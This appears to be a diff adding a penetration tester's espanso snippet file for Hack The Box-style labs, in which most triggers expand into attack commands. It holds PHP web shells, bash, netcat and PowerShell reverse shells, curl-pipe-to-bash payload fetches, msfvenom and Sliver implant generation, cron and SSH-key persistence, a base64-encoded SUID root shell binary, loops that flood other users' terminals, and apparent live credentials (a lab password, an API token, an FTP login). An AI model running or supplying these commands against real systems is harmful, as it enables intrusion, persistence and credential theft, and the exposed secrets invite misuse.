@@ -1,0 +1,312 @@
+# espanso match file
+
+# For a complete introduction, visit the official docs at: https://espanso.org/docs/
+
+# You can use this file to define the base matches (aka snippets)
+# that will be available in every application when using espanso.
+global_vars:
+  - name: "TIP"
+    type: "shell"
+    params:
+      cmd: cat $HOME/.zshrc | grep TIP | awk -F= '{print $2}' | sed 's/"//g'
+  - name: "IP"
+    type: "shell"
+    params:
+      cmd: "ip addr show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1"
+
+  - name: "ssh_key"
+    type: "shell"
+    params:
+      cmd: "cat /home/kriyos/.ssh/id_rsa.pub"
+  - name: "clipboard"
+    type: "shell"
+    params:
+      cmd: "wl-paste"
+
+matches:
+# QOL
+  - trigger: ":paste"
+    replace: "{{clipboard}}"
+  - trigger: ":ip"
+    replace: "{{IP}}"
+  - trigger: ":tip"
+    replace: "{{TIP}}"
+  - trigger: ":unzip"
+    replace: printf "import sys\nimport zipfile\nif __name__ == '__main__':\n    with zipfile.ZipFile(sys.argv[1], 'r') as z:\n        z.extractall()\n" > unzip.py
+  - trigger: ":rdp"
+    replace: "xfreerdp /v:$THM /u:'htb-student' /p:'HTB_@cademy_stdnt!'  /drive:linux,/tmp /dynamic-resolution"
+  - trigger: ":slowrdp"
+    replace: "xfreerdp /u:USER /p:'PASS' /d:inlanefreight.local /v:{{TIP}} /dynamic-resolution /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache"
+  - trigger: ":enablerdp"
+    replace: reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+  - trigger: ":startprocess"
+    replace:  Start-Process -FilePath "C:\Windows\Tasks\agent.exe" -ArgumentList "-connect 10.10.16.198:443 -ignore-cert" -NoNewWindow
+  - trigger: ":mount"
+    replace: rclone mount Backup:BackupsOfKriyos /mnt/Backup --vfs-cache-mode minimal &
+  - trigger: ":bloodhound"
+    replace: "sudo systemctl start docker; sudo bloodhound-cli containers start"
+  - trigger: ":htbpass"
+    replace: 'HTB_@cademy_stdnt!'
+  - trigger: ":selfsign"
+    replace: openssl genpkey -algorithm RSA -out ca.key -aes256 && openssl req -new -x509 -days 365 -key ca.key -out ca.crt && osslsigncode sign -certs ca.crt  -key ca.key  -t http://timestamp.comodoca.com/authenticode -in shell.exe -out shellsign.exe
+  - trigger: ":vmware"
+    replace: 'cd ~/Documents/VMWare/vm-host-modules;sudo make; sudo make install;cd -'
+         
+    # SETUP AND NMAP              
+  - trigger: ":setup"                  
+    replace : |          
+      mkdir -p net && cd net         
+      echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php
+      echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'\"); ?>" > rev.php
+      echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'" > shell.sh
+      msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.6.87.204 LPORT=22 -f elf -o shell86.elf &
+      msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.6.87.204 LPORT=22 -f elf -o shell64.elf &
+      msfvenom -p windows/shell_reverse_tcp LHOST=10.6.87.204 LPORT=22 -f exe -o shell86.exe &
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.87.204 LPORT=22 -f exe -o shell64.exe &
+      cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . &
+      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh & 
+      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O wp.exe & 
+      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
+      wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
+      wget -q https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip && unzip SharpHound-v1.1.0.zip &
+      wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
+      wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe &
+      wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
+      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit &
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &
+      sudo python3 -m http.server 80
+
+  - trigger: ":msfwin"
+    replace: msfvenom -p windows/x64/shell_reverse_tcp LPORT=22 -f exe -o shell.exe LHOST={{IP}}
+
+  - trigger: ":msfmwin"
+    replace: msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=22 -f exe -o shell.exe LHOST={{IP}}
+  - trigger: ":msflin"
+    replace: msfvenom -p linux/x64/shell_reverse_tcp LPORT=22 -f elf -o shell.elf LHOST={{IP}}
+
+  - trigger: ":msfmlin"
+    replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=22 -f elf -o shell.elf LHOST={{IP}}
+  - trigger: ":msfwwin"
+    replace: msfconsole -q -x "use exploit/multi/script/web_delivery; set SRVHOST {{IP}}; set SRVPORT 8100; set TARGET 2; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {{IP}}; set LPORT 8400; exploit -j -z"
+  - trigger: ":msfwlin"
+    replace: msfconsole -q -x "use exploit/multi/script/web_delivery; set SRVHOST 10.10.14.245; set SRVPORT 8100; set TARGET 7; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.245; set LPORT 8400;run;"
+  - trigger: ":lligolo"
+    replace: |
+      listener_add --addr 0.0.0.0:8100 --to 127.0.0.1:8100 --tcp
+      listener_add --addr 0.0.0.0:8200 --to 127.0.0.1:8200 --tcp
+      listener_add --addr 0.0.0.0:8300 --to 127.0.0.1:8300 --tcp
+      listener_add --addr 0.0.0.0:8400 --to 127.0.0.1:8400 --tcp
+  - trigger: ":securecred"
+    replace: $credential = New-Object System.Management.Automation.PSCredential ("DOMAIN\USER", (ConvertTo-SecureString "PASS" -AsPlainText -Force))
+  - trigger: ":smbserver"
+    replace: "impacket-smbserver -smb2support share ."
+#  - trigger: ":port"
+#    replace: sudo ss -tulpn
+  - trigger: ":pyserver"
+    replace: "python3 -m http.server "
+  - trigger: ":thmsmb"
+    replace: "sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali ." 
+  - trigger: ":phpserver"
+    replace: "php -S 0.0.0.0:"
+                                                                                
+  - trigger: ":responder"
+    replace: "sudo responder -I tun0"
+  - trigger: ":ports"
+    replace: "lsof -i -P -n | grep LISTEN"
+  - trigger: ":apad"
+    replace: "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
+  - trigger: ":nc"
+    replace: nc -nvlp 22
+  - trigger: ":upload"
+    replace: "curl https://temp.sh --upload-file "
+  - trigger: ":rockyou"
+    replace: "/usr/share/seclists/Passwords/rockyou.txt "
+  - trigger:  ":handler"
+    replace: msfconsole -q -x 'use exploit/multi/handler;set LHOST {{IP}};set LPORT 4444; set payload windows/x64/meterpreter/reverse_tcp'
+
+# ENUMERATION
+  - trigger: ":nmap"
+    replace: nmap -sC -sV -T4 {{TIP}}
+  - trigger: ":nikto"
+    replace: nikto --url http://{{TIP}}
+  - trigger: ":lping"
+    replace: for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+  - trigger: ":wpscan"
+    replace: wpscan -e dbe,cb,u,vt,ap --api-token yZI2XuVWxqnkOxEsAzLkR58jNzYrc0jDoh1uHtja8b4 --url http://{{TIP}}
+  - trigger: ":wping"
+    replace: for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+
+  - trigger: ":dirsearch"
+    replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u http://{{TIP}}"
+  - trigger: ":ferox"
+    replace: "feroxbuster -x js,html -x php txt json,docx --url http://{{TIP}}"
+  - trigger: ":gobuster"
+    replace: "gobuster dir -w /usr/share/wordlists/dirb/common.txt -x txt,php,htm,html,xml -u http://{{TIP}}"
+  - trigger: ":subdomain"
+    replace: "wfuzz -c --hw 977 -u http://{{TIP}} -H 'Host: FUZZ.target.htb' -w /usr/share/wordlists/dirbuster/subdomains-top1million-5000.txt"
+  - trigger: ":wfuzz"
+    replace: "wfuzz -c --hw 977 -u http://{{TIP}} -H 'Host: FUZZ.target.htb' -w /usr/share/wordlists/dirbuster/subdomains-top1million-5000.txt"
+  - trigger: ":setip"
+    replace: "/opt/backup/setup.sh"
+  - trigger: ":find"
+    replace: 'find / -perm -u=s -type f 2>/dev/null -printf "%f\n"'
+  - trigger: ":dedilab"
+    replace: "sudo openvpn ~/Documents/Enterprise_HTB/Dedicated_Lab_Fagan.ovpn"
+  - trigger: ":academy"
+    replace: "sudo openvpn /home/kriyos/Documents/Academy_HTB/academy-regular.ovpn"
+# REVERSE SHELLS                                                                
+  # LINUX
+  - trigger: ":rbash"
+    replace: "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"
+
+  - trigger: ":rphp"
+    replace: <?php shell_exec("bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"); ?>
+  - trigger: ":phpshell"
+    replace: <?php system($_GET["cmd"]); ?>
+  - trigger: ":wphp"
+    replace: <?php echo shell_exec($_GET['cmd']); ?>
+    
+  - trigger: ":rcurl"                                                           
+    replace: curl http://{{IP}}/shell.sh | bash
+                                                                                
+  - trigger: ":rwget"                                                           
+    replace: wget http://{{IP}}/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
+  - regex: ":wcurl\\((?P<file>.*)\\)"
+    replace: Invoke-WebRequest -Uri http://{{IP}}:8000/{{file}} -OutFile C:\{{file}}
+  - trigger: ":mkfifo"                                                          
+    replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} 22 >/tmp/f
+    
+  # WINDOWS
+  - trigger: ":rpowershell"
+    replace: |
+      $LHOST = "{{IP}}"; $LPORT = 22; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close() 
+
+# POST
+  - trigger: ":pty"
+    replace: |
+      python3 -c 'import pty; pty.spawn("/bin/bash")' || python2 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || python2.7 -c 'import pty; pty.spawn("/bin/bash")' || python3.6 -c 'import pty; pty.spawn("/bin/bash")' || python3.5 -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null 
+      export TERM=screen
+      stty rows 60
+      stty columns 150
+
+  - trigger: ":tty"
+    replace: |
+      reset
+      stty raw -echo; fg
+      stty rows 60 
+      stty columns 150
+      export TERM=screen
+    
+  - trigger: ":sshpersist"
+    replace: |
+      mkdir -p ~/.ssh
+      echo "{{ssh_key}}" >> ~/.ssh/authorized_keys
+# Sliver Setup
+  - trigger: ":sprofile"
+    replace: profiles new --http {{IP}}:8088 --format shellcode htb
+  - trigger: ":slistener"
+    replace: stage-listener --url tcp://{{IP}}:4443 --profile htb
+  - trigger: ":sbeacon"
+    replace: generate beacon --http {{IP}}:8088 --os windows --arch amd64
+  - trigger: ":sstager"
+    replace: generate stager --lhost {{IP}} --lport 4443 --format csharp
+  - trigger: ":shttp"
+    replace: http -L {{IP}} -l 8088
+    #generate stager --profile htb --url tcp://{{IP}}:4443 --format shellcode
+    #generate stager --profile htb --url tcp://{{IP}}:4443 --format exe
+      
+  - trigger: ":cronpersist"
+    replace: crontab -l | { cat; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"; } | crontab -
+  - trigger: ":zlocal"
+    replace: "cd /opt/backup/ztransfer;timeout 1m python3 -m http.server 8008; cd -" 
+  - trigger: ":zremote"
+    replace: "curl -o /tmp/zellij.tar.gz http://{{IP}}:8008/zellij-x86_64-unknown-linux-musl.tar.gz;tar -xf /tmp/zellij.tar.gz -C /tmp;/tmp/zellij --layout compact"
+  - trigger: ":wget"
+    replace: wget http://{{IP}}:8000/
+  - trigger: ":curl"
+    replace: "curl http://{{IP}}:8000/"
+  - trigger: ":certutil"
+    replace: certutil.exe -urlcache -split -f http://{{IP}}/
+  - trigger: ":iwr"
+    replace: iwr http://{{IP}}/ -OutFile ./file.exe
+  
+  - trigger: ":pligolo"
+    replace: sudo ip tuntap add user kriyos mode tun ligolo ; sudo ip link set ligolo up && sudo /opt/ligolo-ng/proxy -selfcert -laddr 0.0.0.0:443
+
+  - trigger: ":aligolo"
+    replace: ./agent -connect {{IP}}:443 -ignore-cert &
+
+  - trigger: ":rligolo"
+    replace: sudo ip route add 192.168.110.0/24 dev ligolo 
+  - trigger: ':wligolo'
+    replace: Start-Process -FilePath "$PWD\agent.exe" -ArgumentList '-connect {{IP}}:443','-ignore-cert','-retry' -WorkingDirectory $PWD -WindowStyle Hidden
+  - trigger: ":showtables"
+    replace: 'SELECT * FROM INFORMATION_SCHEMA.TABLES;'
+  - trigger: ":ftp"
+    replace: "ftp u610712232@195.35.10.74"
+# EXPLOITS
+
+  - trigger: ":suid"
+    replace: find / -perm -u=s -type f 2>/dev/null
+    
+  - trigger: ":fileprivesc"
+    replace: echo "f0VMRgIBAQCwaw8FicfrGAIAPgABAAAACIACAAAAAABAAAAAAAAAADHAsGkPBTHAsGzrJEAAOAABAEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAgAIAAAAAAA8FiccxwOsYnwAAAAAAAACfAAAAAAAAAAAAIAAAAAAAsGoPBUi/L2Jpbi9zaABXMcCwO0iJ51ZIieZIieIPBYnHMcCwPA8F" | base64 -d >> /tmp/tmp && sudo chown root:root /tmp/tmp && sudo chmod +sx /tmp/tmp
+
+  - trigger: ":ptspam"
+    replace: ctty=$(tty | cut -d/ -f4) && while :; do sleep 1; for u in $(ls /dev/pts | grep -Ev "$ctty"); do cat /dev/urandom > /dev/pts/$u & disown; done; done
+  - trigger: ":fptspam"
+    replace: while :; do sleep 1; for u in $(ls /dev/pts/ | grep -v -E "^$(ls /dev/pts | xargs -I {} stat -c %U /dev/pts/{})$"); do owner=$(stat -c %U /dev/pts/$u); [ "$owner" != "root" ] && [ "$u" != "$(basename $(readlink /proc/$$/fd/0))" ] && cat /dev/urandom > "/dev/pts/$u" & disown; done; done
+  - trigger: ":manspider"
+    replace:  manspider 445-TCP.txt -u user -p pass -f passw user admin account network login logon cred securestring net -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg txt cfg conf config xml
+# SLIVER
+
+# --------------------------
+# Sliver
+# --------------------------
+  - trigger: ":sstart"
+    replace: |
+      sliver
+      profiles new beacon --arch amd64 --os windows --mtls {{IP}}:443 -f shellcode --timeout 300 --seconds 5 --jitter 1 kriyos 
+      mtls --lhost {{IP}} --lport 443 
+      generate beacon --http {{IP}} --save .
+
+  # Create Sliver Profile
+  - trigger: ":sprofile"
+    replace: "profiles new beacon --arch amd64 --os windows --mtls {{IP}}:443 -f shellcode --timeout 300 --seconds 5 --jitter 1 kriyos"
+
+  # Start mTLS Listener
+  - trigger: ":smtls"
+    replace: "mtls --lhost {{IP}} --lport 443"
+
+  # Generate Windows Implant (Beacon)
+  - trigger: ":sbeacon"
+    replace: "generate beacon --mtls {{IP}} --save ."
+  # Generate Windows Implant (Beacon)
+  - trigger: ":sgenerate"
+    replace: "generate --mtls {{IP}} --save ."
+
+  # Generate Stager
+  - trigger: ":sstager"
+    replace: "generate stager -r http --lhost {{IP}} --lport 8080"
+
+  # Start HTTP Listener
+  - trigger: ":shttp"
+    replace: "http --lhost {{IP}} --lport 8088"
+
+  # Create Stage Listener
+  - trigger: ":sstagel"
+    replace: "stage-listener --url http://{{IP}}:8080 --profile kriyos --prepend-size"
+
+  # Start SOCKS5 Proxy
+  - trigger: ":ssocks"
+    replace: "socks5 start -P 1080"
+
+  # Pivot through a Target
+  - trigger: ":spivot"
+    replace: "pivots tcp --bind 172.16.1.11"
+
+  # Set up Port Forwarding
+  - trigger: ":srportfwd"
+    replace: "rportfwd add -b 8080 -r 127.0.0.1:8080"
